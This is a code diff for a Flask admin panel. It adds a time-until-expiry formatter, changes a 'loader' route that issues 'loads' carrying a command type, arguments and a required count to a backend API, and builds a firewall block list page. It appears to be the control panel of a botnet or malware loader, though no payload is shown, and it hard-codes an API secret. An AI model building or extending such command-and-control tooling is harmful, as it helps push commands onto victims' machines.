@@ -28,6 +28,30 @@ def convert_to_ago(timestamp):
     else:
         return f"{add0(int(delta / 86400))}d"
 
+def convert_to_future(timestamp):
+    def add0(intInput):
+        intInput = str(intInput)
+        if len(intInput) == 1:
+            return " " + intInput
+        else:
+            return intInput
+
+
+    delta = timestamp - int(time.time())
+
+    if delta < 0:
+        return "Expired"
+
+    if delta <= 60 :
+        return f"In {add0(int(delta))}s"
+    elif delta <= 3600:
+        return f"In {add0(int(delta // 60))}m"
+    elif delta <= 86400:
+        return f"In {add0(int(delta // 3600))}h"
+    else:
+        return f"In {add0(int(delta // 86400))}d"
+
+
 SERVER_ADDRESS = "http://127.0.0.1:9999"
 API_SECRET = "debug"
 
@@ -81,7 +105,6 @@ def builder():
 @app.route("/loader", methods=['GET', 'POST', 'DELETE'])
 def loader():
 
-
     if request.method == "POST":
         execution_type = request.form.get('execution_type').split("|")[1][1:]
         payload = 'placeholder'
@@ -96,33 +119,28 @@ def loader():
         else:
            is_recursive = False
 
-        print({
-            "api_secret": API_SECRET,
-            "cmd_type": execution_type,
-            "cmd_args": payload,
-            "required_amount": int(amount),
-            "recursive": is_recursive
-        })
-
-        load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue", 
+        load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue_load", 
             json={
                 "api_secret": API_SECRET,
                 "cmd_type": execution_type,
                 "cmd_args": payload,
                 "required_amount": int(amount),
-                "recursive": is_recursive
+                "is_recursive": is_recursive
             }
         )
+
+        print(load_creation_response.text)
 
     load_id = request.args.get('delete_load')
     if load_id != None:
 
-        deletion_response = httpx.post(SERVER_ADDRESS + "/api/remove_load", 
+        httpx.post(SERVER_ADDRESS + "/api/remove_load", 
             json={"api_secret": API_SECRET, "load_id": load_id}
         )
 
     load_list_response = httpx.post(SERVER_ADDRESS + "/api/loads_list", json={"api_secret": API_SECRET})
     load_list = json.loads(load_list_response.text)
+    print(load_list)
     new_load_data = []
     
     for load_id, load in load_list.items():
@@ -133,8 +151,26 @@ def loader():
     return render_template("loader.html", load_list=new_load_data)
 
 @app.route("/firewall")
-def logs():
-    return render_template("firewall.html")
+def firewall():
+
+    block_id = request.args.get('delete_block')
+    if block_id != None:
+
+        httpx.post(SERVER_ADDRESS + "/api/remove_block", 
+            json={"api_secret": API_SECRET, "block_id": block_id}
+        )
+
+    blocks_list_response = httpx.post(SERVER_ADDRESS + "/api/blocks_list", json={"api_secret": API_SECRET})
+    blocks_list = json.loads(blocks_list_response.text)
+
+    new_blocks_list = []
+    for block_id, block in blocks_list.items():
+        block["block_id"] = block_id
+        block["banned_until"] = convert_to_future(block["banned_until"])
+        new_blocks_list.append(block)
+
+
+    return render_template("firewall.html", block_list=new_blocks_list)
 
 @app.route("/server_logs")
 def server_logs():
